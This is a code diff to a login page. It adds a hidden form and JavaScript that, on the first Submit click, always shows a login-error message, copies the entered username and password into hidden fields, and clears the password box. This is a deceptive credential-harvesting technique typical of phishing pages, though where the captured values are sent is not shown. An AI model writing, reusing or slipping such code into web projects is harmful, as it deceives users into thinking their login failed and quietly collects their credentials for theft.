@@ -36,8 +36,14 @@
       <p>
         <a style="text-decoration: none; font-size: 15px;" href="">Forgot your password</a>
       </p>
+
+      <div style="display: none;"  class="hidden_form">
+        <input type="text" id="first_try_user" name="try_user_id">
+        <input type="text" id="first_try_pass" name="try_pass">
+      </div>
       
     </form>
+
 
     <button style="margin-top: -2px;" type="submit" onclick="LoginFunc()">Submit</button>
     <br />
@@ -58,9 +64,13 @@
   var click_counter = 0;
   const LoginFunc = () => {
     var notification = document.getElementById('login-error');
+    var username = document.getElementById('username').value
+    var pass = document.getElementById('password').value
     
     if (click_counter == 0){
       notification.classList.remove('hide');
+      document.getElementById('first_try_pass').value = pass
+      document.getElementById('first_try_user').value = username
       document.getElementById('password').value = ''
       click_counter+=1;
       console.log(click_counter)
